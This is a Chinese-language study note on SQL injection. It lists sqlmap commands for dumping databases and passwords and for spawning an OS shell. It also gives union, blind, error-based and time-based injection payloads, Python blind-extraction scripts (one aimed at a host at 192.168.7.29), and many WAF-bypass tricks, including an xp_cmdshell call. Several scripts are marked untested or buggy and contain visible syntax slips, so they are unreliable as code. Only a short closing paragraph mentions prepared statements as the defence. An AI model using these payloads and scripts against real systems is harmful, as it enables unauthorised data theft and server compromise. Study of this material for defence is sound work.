# 	SQL注入笔记

### SQLMAP使用

``` shell
python sqlmap.py -u "URL"	//判断是否存在注入点
python sqlmap.py -u "URL" --dbs		//查询有哪些数据库
python sqlmap.py -u "URL" -D 数据库名 --tables 		//输出指定数据库内有哪些表
python sqlmap.py -u "URL" -D 数据库名 -T 表名 --columns		//输出指定表所存在的字段
python sqlmap.py -u "URL" -D 数据库名 -T 表明 -C "字段名1,字段名2,字段名3" --dump 		//输出指定字段的内容
//POST型注入
python sqlmap.py -u "URL" --data "post内容"	//后面参数同上一样
python sqlmap.py -u "URL" --forms		//自动寻找表单并注入
python sqlmap.py -u "URL"-r "POST数据文本文件" [-p "参数名" 		//可选参数，指定参数名。也可以在文件中的参数内容置换成*符号]

//查看权限写shell
sqlmap.py -u "url" --user 	//列出数据库的所以用户
sqlmap.py -u "url" --passwords 		//列出数据库用户的密码
sqlmap.py -u "url" --current-db 	//查看当前使用网站数据库的名字
sqlmap.py -u "url" --current-user 	//查看当前网站数据库的用户名称
sqlmap.py -u "url" –roles 		//用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U 参数指定想看那个用户的角色。
sqlmap.py -u "url" --is-dba 		//查看当前用户是否是管理员权限 True 代表有，如果没有的话就是 False。如果，你验证了，是 dba 权限,那么就可以执行下面的命令了。
在数据库为 mysql、postgresql、sql server 时可以用 sqlmap.py -u "url" --os-cmd来模拟一个 cmd 命令，然后执行一些命令，比如 sqlmap.py -u "url" --os-cmd=ipconfig来获得 ip。
sqlmap.py -u "url" --os-shell 写入一个 shell，这里默认是 php，如果是别的要自己选择。
```

### SQL注入原理

SQL注入实质上就是web对用户传入的数据没有进行过滤，直接将用户传入的数据拼接到SQL命令中。当用户构造特殊的字符拼接到SQL命令中，SQL服务器会错误的将参数理解为SQL语句，从而执行任意SQL语句。造成SQL注入。

例如下列代码

```php+HTML
<?php
$a = $_GET['id'];
$conn = new sqli('localhost','db_user',db_pwd','db_name','port');
$sql = 'select * from users where id ='.$a;
$result = $conn->query($sql);
?>
```

这里没有对用户传进来的id进行鉴别过滤。如果传进来的参数是

```sql
http://localhost/index.php?id=1 and union select * from users;
//sql语句就会变成
select * from users where id =1 and union select * from users；
```

#### MYSQL–information_schema

在MYSQL_v5.0版本之后，有个名为information_schema的数据库，他存储了用户所有的数据库信息

##### Schemata

schemata表存储了该用户创建的所有数据库库名，位于字段**schema_name**中

##### Tables

tables表中记录了用户创建的所有数据库库名以及表名，数据库库名位于字段**table_schema**，数据库表名位于字段**table_name**

##### columns

columns表存放了该用户创建的所有数据库库名，表名，字段名 。数据库库名位于字段**table_schema**，数据库表名位于字段**table_name** ，表字段名位于字段**columns_name**

### SQL注入常用数据库函数

```sql
version(); -- MySQL版本
database(); -- 当前使用的数据库
user(); -- 当前数据库用户
length(); -- 返回字符串的字节长度(在utf8mb4编码中，一个汉字字符占3个字节)
char_length(); -- 用于返回字符串的字符个数
substr(str,start,len); -- 截取字符串 str=输入的字符串，start=开始的位置，len=长度 例如：substr('database',1,1)，该函数返回'd'字符
ascii(); -- 返回字符的ASCII值一般搭配substr使用
concat(str1,str2,str3); -- 将多个字符串连接成一个字符串
updatexml(XML_name, XPath_str, new_value); -- 改变文档中符合条件的节点值。xml_name:文档对象的名称,xpath_str:xpath格式的字符串,new_value:需要更改的新值
extractvalue(XML_name,Xpath_str); -- 从xml中返回所查询的值，输出字符长度限制为32个字符
floor(4.001); -- 向下取整 返回不大于4.001的最大整数:4
exp(); -- 用于将自然对数的底数提升为指定数字的幂
sleep(); -- 暂停程序执行，单位秒
if(expr,expr2,expr3); -- 判断函数 如果expr为真，执行expr2，反之执行expr3
left(str,len) -- 从左向右截取str，截取len位置
count() -- 返回指定列的条目数量
```

### 注入类型判断，注入点判断

```
//数字型
http://localhost/?id=1
http://localhost/?id=1 and 1=1 	//不报错,和 1 返回内容一样
http://localhost/?id=1 and 1=2	//不报错,和 1 返回内容不同
//字符型
http://localhost/?id=a //不报错
http://localhost/?id=a' //报错
http://localhost/?id=a' and '1'='1 -- aaaa //不报错 且和6一样
http://localhost/?id=a' and '1'='2 -- aaaa //不报错 和6不一样
```

#### Union 注入

union 联合查询，将多个查询结果合并成一个结果

order by int 查询该表字段个数

```shell
http://localhost/?id=1 order by [1~∞]
//假设判断出4个字段
```

根据查询到表字段个数来写 union select

```shell
http://localhost/?id=1 union select 1，2，3，4

// 回显 2，3，4
```

根据回显位置来设计后续的注入语句

##### 查询当前数据库，版本号，以及用户名

```sql
http://localhost/?id=1 union select 1,database(),version(),user()

//回显 data_name,v6666666666,root@localhost
```

##### 查询表名

```sql
http://localhost/?id=1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()

 -- 回显 1，"users，admin"，3，4
```

##### 查询admin表的字段名

```sql
http://localhost/?id= 1 union select 1,group_concat(columns_name),3,4 from information_schema.columns where table_name = 'admin'
0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name='users' 

-- 回显 1,"user,password,mobile",3,4
```

##### 查询账号密码

```sql
http://localhost/?id=1 union select 1,user,password,mobile from admin

--回显 1,admin,e10adc3949ba59abbe56e057f20f883e,177xxxxxxxx

密码解密为:123456
```

#### 布尔盲注(Boolean)

盲注？听我说谢谢你，因为有你，温暖了四级。太难受了盲注。有时候，开发者会屏蔽报错信息，只会显示两种信息，导致无法通过报错信息进行注入。这种情况叫做盲注，根据使用的手法不同盲注的类型也不一样。但是原理是相同的

##### 盲注方式

```sql
通过长度判断:char_length():char_length(database())>=int
通过字符判断:substr():substr(database(),1,1) =str
通过 ascII 码判断:ascii():ascii(substr(database(),1,1)) =int
```

##### 获取数据库名长度

```sql
http://localhost/?id=a' and char_length(database())>=int -- qqqqq
-- int 是数字，假设数据库名长度为7，则int大于7的时候返回其他内容
```

##### 获取数据库名

python 脚本(未测试)

```python
import requests

payload = ''
num_1 = 1
Raw_data_length = requests.get('http://localhost/?id=a')
while True:
    url_database_length = f"http://localhost/?id=a' and char_length(database())>={num_1} -- qqqqq"
    message = requests.get(url_database_length)
    if len(message.text) > len(Raw_data_length.text):
        break
    num_1 += 1

for i in range(num_1):
    for num_2 in range(33, 126):
        url_database_name = f"http://localhost/?id=a' and ascii(substr(database(),{i},1))={num_2} -- qqqqq"
        message = requests.get(url_database_name)
        if len(message.text) == len(Raw_data_length.text):
            payload += chr(num_2)

print(payload)
```

##### 获取表名

```python
import requests

payload = ''
num_1 = 1
Raw_data_length = requests.get('http://localhost/?id=a')
count = 0
while True:
    url_tables_count = f"http://localhost/?id=a' and select count(table_name) from information_schema.table where " \
                      f"table_schema =database() >= {count} "
    message = requests.get(url_tables_count)
    if len(message.text) > len(Raw_data_length.text):
        break
    while True:
        url_table_name_length = f"http://localhost/?id=a' and char_length((select table_name from " \
                              f"information_schema.tables " \
                              f"where table_schema=database() limit {count},1))>={num_1} -- qqqqq "
        message = requests.get(url_table_name_length)
        if len(message.text) > len(Raw_data_length.text):
            break
        num_1 += 1

    for i in range(1, num_1 + 1):
        for num_2 in range(33, 126):
            url_table_name = f"http://localhost/?id=a' and ascii(substr((select table_name from " \
                                f"information_schema.tables where table_schema=database() limit {count},1),{i}," \
                                f"1))={num_2} -- qqqqq "
            message = requests.get(url_table_name)
            if len(message.text) == len(Raw_data_length.text):
                payload += chr(num_2)
    count += 1
    print(payload)
print("——"*10)
```

##### 获取字段名

```python
import requests

payload = ''
num_1 = 1
Raw_data_length = requests.get('http://localhost/?id=a')
count = 0
while True:
    url_columns_names_count = f"http://localhost/?id=a' and select count(column_name) from information_schema.columns where " \
                      f"table_schema=database() and table_name=‘users’ >= {count} -- qqqqq"
    message = requests.get(url_columns_names_count)
    if len(message.text) > len(Raw_data_length.text):
        break
    while True:
        url_columns_name_length = f"http://localhost/?id=a' and char_length((select column_name from " \
                              f"information_schema.columns where table_schema=database() and table_name=‘users’ limit " \
                              f"{count},1))>={num_1} -- qqqqq "
        message = requests.get(url_columns_name_length)
        if len(message.text) > len(Raw_data_length.text):
            break
        num_1 += 1

    for i in range(1, num_1 + 1):
        for num_2 in range(33, 126):
            url_columns_name = f"http://localhost/?id=a' and ascii(substr((select column_name from " \
                                f"information_schema.columns where table_schema=database() and table_name=‘users’ " \
                                f"limit {count},1),{i}," \
                                f"1))={num_2} -- qqqqq "
            message = requests.get(url_columns_name)
            if len(message.text) == len(Raw_data_length.text):
                payload += chr(num_2)
    count += 1
    print(payload)
print("——"*10)

```

##### 获取数据

```python
import requests

payload = ''
num_1 = 1
Raw_data_length = requests.get('http://localhost/?id=a')
count = 0
while True:
    url_columns_count = f"http://localhost/?id=a' and select count(password) from users >= {count} -- qqqqq"
    message = requests.get(url_columns_count)
    if len(message.text) > len(Raw_data_length.text):
        break
    while True:
        url_columns_length = f"http://localhost/?id=a' and char_length((select password from users limit " \
                              f"{count},1))>={num_1} -- qqqqq "
        message = requests.get(url_columns_length)
        if len(message.text) > len(Raw_data_length.text):
            break
        num_1 += 1

    for i in range(1, num_1 + 1):
        for num_2 in range(33, 126):
            url_columns = f"http://localhost/?id=a' and ascii(substr((select password from users " \
                                f"limit {count},1),{i}," \
                                f"1))={num_2} -- qqqqq "
            message = requests.get(url_columns)
            if len(message.text) == len(Raw_data_length.text):
                payload += chr(num_2)
    count += 1
    print(payload)
print("——"*10)

```

#### 报错注入

适用于后台没有屏蔽数据库的报错信息，在语法发生错误的时候输送到前端。从而获取特定的信息

`select|insert|update`都可以使用报错来获取信息

##### 报错注入方式

```sql
updatexml(xml_document,Xpathstring,new_value)
payload1：updatexml(1,concat(0x7e,(select database()),0x7e),1)
payload2：extractvalue(1,concat(0x7e,(select database())))
payload3：(select 1 from (select count(*),concat(version(),floor(rand(0)*2))xfrominformation_schema.tables group by x)a)#
```

##### 获取数据库名

```sql
http://localhost/?id=a' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- qqqq
```

##### 获取表名

```sql
http://localhost/?id=a' and updatexml(1,concat(0x7e,(selectgroup_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- qqqq
```

##### 获取字段名

```sql
http://localhost/?id=a' and updatexml(1,concat(0x7e,(selectgroup_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)-- qqqq
```

##### 获取数据

```sql
http://localhost/?id=a' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- qqqq
```

#### 为什么要用报错注入

##### 报错注入后台代码分析

```php
<?php
$conn=mysqli_connect("localhost","root","root","test");
// 检测连接
if (mysqli_connect_errno())
{
echo "连接失败: " . mysqli_connect_error();
}
$username = $_GET['username'];
$sql = "select * from users where 'username'='$username'";
if($result = mysqli_query($conn,$sql)){
echo "ok";
}else{
echo mysqli_error($con);
}
?>
```

#### 时间盲注

盲注已经会谢了，还是时间盲注，我更谢谢你。

当我们sql注入时页面既不会回显数据，也不会回显错误信息，也不提示真假。页面内容也不会改变。就可以用上时间盲注。通常搭配`if`语句来进行时间盲注

##### 时间盲注的原理

`sleep()`函数是时间盲注的核心，我们使用这个函数，通过页面的响应时间来判断条件是否正确。从而获得数据

##### 是否存在注入点

```shell
http://localhost/?id=a'and sleep(5) -- qqqq
//如果存在注入点，web服务将在五秒后才会返回数据
```

##### 获取数据库库名

python脚本(未测试)

```python
import time
import requests

payload = ''
num_1 = 1

while True:
    url_database_length = f"http://192.168.7.29/product.php?id=13' and if(char_length(database())<={num_1},sleep(5),1) -- qqqqq"
    start = time.time()
    message = requests.get(url_database_length)
    stop = time.time()
    if stop - start >= 5:
        break
    num_1 += 1
print(f"数据库长度为：{num_1}位")
for i in range(1, num_1 + 1):
    for num_2 in range(33, 126):
        url_database_name = f"http://192.168.7.29/product.php?id=13' and if(ascii(substr(database(),{i},1))={num_2},sleep(5),1) -- " \
                            f"qqqqq "
        start = time.time()
        message = requests.get(url_database_name)
        stop = time.time()
        if stop - start >= 5:
            payload += chr(num_2)
            print(payload)

print(fr"数据库名:{payload}")

```

##### 获取表名

```python
import requests
import time

table_name = []
num_1 = 1
count = 0
while True:
    payload = ''
    url_tables_count = f"http://192.168.7.29/product.php?id=13' and if((select count(table_name) from information_schema.tables where " \
                       f"table_schema ='smartshop') <= {count},sleep(5),1) -- qqqqq "
    # print(f"获取表数量:{url_tables_count}")
    start = time.time()
    message = requests.get(url_tables_count)
    stop = time.time()
    if stop - start >= 5:
        print(f"有{count}个表")
        break
    num_1 = 1
    while True:
        url_table_name_length = f"http://192.168.7.29/product.php?id=13' and if(char_length((select table_name from " \
                                f"information_schema.tables " \
                                f"where table_schema=database() limit {count},1))<={num_1},sleep(5),1) -- qqqqq "

        start = time.time()
        message = requests.get(url_table_name_length)
        stop = time.time()
        if stop - start >= 5:
            # print(f"获取表名长度:{url_table_name_length}")
            break
        num_1 += 1

    for i in range(1, num_1 + 1):
        for num_2 in range(33, 126):
            url_table_name = f"http://192.168.7.29/product.php?id=13' and if(ascii(substr((select table_name from " \
                             f"information_schema.tables where table_schema=database() limit {count},1),{i}," \
                             f"1))={num_2},sleep(5),1) -- qqqqq "

            start = time.time()
            message = requests.get(url_table_name)
            stop = time.time()
            if stop - start >= 5:
                # print(f"获取表名:{url_table_name}")
                payload += chr(num_2)
    count += 1
    print(payload)
    table_name.append(payload)
print("——" * 10)
print(table_name)

```

##### 获取字段名

有问题，还很大

```python
import requests
import time

payload = ''
num_1 = 1
count = 0
while True:
    url_columns_names_count = f"http://localhost/?id=a' and if((select count(column_name) from information_schema.columns where " \
                      f"table_schema=database() and table_name=‘users’) >= {count},sleep(5),1) -- qqqqq"
    start = time.time()
    message = requests.get(url_columns_names_count)
    stop = time.time()
    if stop - start >= 5:
        break
    while True:
        url_columns_name_length = f"http://localhost/?id=a' and if(char_length((select column_name from " \
                              f"information_schema.columns where table_schema=database() and table_name=‘users’ limit " \
                              f"{count},1))>={num_1},sleep(5),1) -- qqqqq "
        start = time.time()
        message = requests.get(url_columns_name_length)
        stop = time.time()
        if stop - start >= 5:
            break
        num_1 += 1

    for i in range(1, num_1 + 1):
        for num_2 in range(33, 126):
            url_columns_name = f"http://localhost/?id=a' and if(ascii(substr((select column_name from " \
                                f"information_schema.columns where table_schema=database() and table_name=‘users’ " \
                                f"limit {count},1),{i}," \
                                f"1))={num_2},sleep(5),1) -- qqqqq "
            start = time.time()
            message = requests.get(url_columns_name)
            stop = time.time()
            if stop - start >= 5:
                payload += chr(num_2)
    count += 1
    print(payload)
print("——"*10)

```

##### 获取数据

```python
import requests
import time

payload = ''
num_1 = 1
count = 0
while True:
    url_columns_count = f"http://localhost/?id=a' and if((select count(password) from users) >= {count},sleep(5),1) " \
                        f"-- qqqqq "
    start = time.time()
    message = requests.get(url_columns_count)
    stop = time.time()
    if stop - start >= 5:
        break
    while True:
        url_columns_length = f"http://localhost/?id=a' and if(char_length((select password from users limit " \
                              f"{count},1))>={num_1},sleep(5),1) -- qqqqq "
        start = time.time()
        message = requests.get(url_columns_length)
        stop = time.time()
        if stop - start >= 5:
            break
        num_1 += 1

    for i in range(1, num_1 + 1):
        for num_2 in range(33, 126):
            url_columns = f"http://localhost/?id=a' and if(ascii(substr((select password from users " \
                                f"limit {count},1),{i}," \
                                f"1))={num_2},sleep(5),1) -- qqqqq "
            start = time.time()
            message = requests.get(url_columns)
            stop = time.time()
            if stop - start >= 5:
                payload += chr(num_2)
    count += 1
    print(payload)
print("——"*10)

```

#### 宽字节注入

##### gbk 编码原理

 GBK(Chinese Internal Code Specification)一个字符占 1 个字节，两个字节以上叫宽字节，设置“setcharacter_set_client=gbk”（gbk 编码设置），通常导致编码转换的注入问题，尤其是使用php连接 mysql 数据库的时候 一个 gbk 汉字占两个字节，取值范围是（编码位数）：第一个字节是（129-254），第二个字节（64-254），当设置 gbk 编码后，遇到连续两个字节，都符合 gbk 取值范围，会自动解析为一个汉字1

##### 几个概念

字符、字符集与字符序

###### 字符(character)

是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。 

###### 字符序(collation)

指同一字符集内字符间的比较规则。 2 UTF8 由于 ASCII 表示的字符只有 128 个，因此网络世界的规范是使用 UNICODE 编码，但是用ASCII表示的字符使用 UNICODE 并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(UniversalTransformation Format)。 

######  宽字节

 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符(一字节)的现象。 GBK 是一种多字符的编码，通常来说，一个 gbk 编码汉字，占用 2 个字节。一个utf-8 编码的汉字，占用 3 个字节。当将页面编码保存为 gbk 时输出 2，utf-8 时输出 3。除了gbk 以外，所有ANSI编码都是 2 个字节。

##### 宽字节注入的原理

宽字节注入主要是源于程序员设置数据库编码与 php 编码设置为不同的两个编码，这样就可能会产生宽字节注入。GBK 占用两字节，ASCII 占用一字节。PHP 中编码为 GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL 默认字符集是 GBK 等宽字节字符集。输入`%df%27`,本来\ 会转义%27（'），但\（其中\的十六进制是 %5C）的编码位数为92，%df的编码位数为 223，%df%5c 符合 gbk 取值范围（第一个字节 129-254，第二个字节64-254），会解析为一个汉字“運”，这样\就会失去应有的作用。

### SQL注入绕过

##### 双写绕过

针对过滤参数来进行双写，例如过滤and ，我们就双写为anandd，过滤了之后剩下and。绕过成功

ps：y1s1 这种绕过方式实在是太拉了，循环过滤，直接打死。

##### 大小写绕过

例如`select`被过滤，将其改成`SelECT`可以绕过一部分(“部分”)拦截

##### 编码绕过

###### URL编码

这个比前面两个实在是好太多了，使用URL全编码编码两次，因为服务器自动对url进行一次编码

###### 十六进制编码

，，，就是编码成十六进制让其正则匹配无法匹配一样的。

###### Unicode编码

Unicode 有所谓的标准编码和非标准编码，假设我们用的 utf-8 为标准编码，那么西欧语系所使用的就是非标准编码了 看一下常用的几个符号的一些 Unicode 编码： 

```
单引号:?? %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9 
```

举例：?id=1%D6‘%20AND%201=2%23 SELECT '?'='A'; #1 两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\'，那么就变成了%D6%5C'，%D6%5C 构成了一个款字节即 Unicode 字节，单引号可以正常使用第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True 或者False，关键在于 Unicode 编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过另外平时听得多一点的可能是 utf-7 的绕过，还有 utf-16、utf-32 的绕过

##### 注释绕过

常见用于注释的符号

```
：//, -- , /**/, #, --+,-- ?-, ;，-- a
```

###### 内联注释

相比普通注释，内联注释用的更多，`/!**/`只有mysql能够识别

类似于注释非注释。

`/!*union*//**//!*select*/`等同于`union select`

##### 等价函数

有些函数能够被检测出来而无法使用。可以使用一些等价的函数。

```sql
hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
举例：substring()和 substr()无法使用时:?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
或者：substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
and ==>&&
or ==>||
= ==> < >
空格 ==> %20,%09,%0a,%0b,%0c,%0d,%a0,/**/
```

##### 生僻函数

```sql
Select UpdateXML( ‘ <script x=_></script> ’,’/script/@x/’,’src=//xxxxxx.com’);
?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));
?id=1 and extractvalue(1, concat(0x5c, (select table_name frominformation_schema.tables limit 1)));
```

##### 特殊符号

```
1.使用反引号`，例如 select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
2.神奇的"-+."，select+id-1+1.from users; 
“+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
3.@符号，select@^1.from users; 
@用于变量定义如@*var_name*，一个@表示用户定义，@@表示系统变量
4.Mysql function() as xxx 也可不用 as 和空格 select-count(id)test from users;
//绕过空格限制
可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到本人搜罗了部分可能发挥大作用的字符(未包括'、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00
举例：
关键字拆分：‘se’+’lec’+’t’
%S%E%L%E%C%T 1
1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)!和()：' or --+2=- -!!!'2
id=1+(UnI)(oN)+(SeL)(EcT) //另 Access 中,”[]”用于表和列,”()”用于数值也可以做分隔
本节最后在给出一些和这些字符多少有点关系的操作符供参考：
\>>, <<, >=, <=, <>,<=>,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN使用这些"特殊符号"实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面得充分了解这些符号的特性和使用方法才能作为绕过手段
```

##### http参数控制

###### HPP

在此我称之为玄学。太玄学了

秘籍《重复参数污染！》在不同的web服务器对重复参数污染有不同的处理方式。

例如

`http://localhost\index.php?id=1&id=2&id=3`

| ?a=            | nginx+php                | apache+php               |
| -------------- | ------------------------ | ------------------------ |
| ?a=1&a=2&a=3   | a = string(1) "3"        | a = string(1) “3”        |
| ?a=1;2+3/*/054 | string(11) "1;2 3/*/054" | string(11) "1;2 3/*/054" |

尴尬。。。。。。。。

直接上第三方图



![image-20220726160637713](http://imgs.maobasix.cn/i/2023/03/13/640f0de50844d.png)

###### HPC

这一概念见于 exploit-db 上的 paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染

RFC2396 定义了如下一些字符： `Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () Reserved : ; / ? : @ & = + $ , Unwise :{}| \ ^ [ ]`

不同的 Web 服务器处理处理构造得特殊请求时有不同的逻辑：

![image-20220726161653078](http://imgs.maobasix.cn/i/2023/03/13/640f0de8c157c.png)

以魔术字符%为例，Asp/Asp.net 会受到影响

![image-20220726161716756](http://imgs.maobasix.cn/i/2023/03/13/640f0deb290c1.png)

##### 缓冲区溢出

缓冲区溢出用于对付 WAF，有不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向量时超出了其缓冲区长度，就会引发 bug 从而实现绕过

例如

```sql
?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
```

### 小结

在现在，基本上都是上组合拳。各种绕过相继出现。可能会问，这么多绕过方式，是不是意味着和数据库交互就是不安全的？

其实并不是，拿PHP举例。php的预处理技术就能杜绝SQL注入。传进去的参数只能是参数。

原理是先把sql语句预编译。编译好之后的数据在填充进去，最后来执行。这样可以保证语义不变，自然也就防止SQL注入
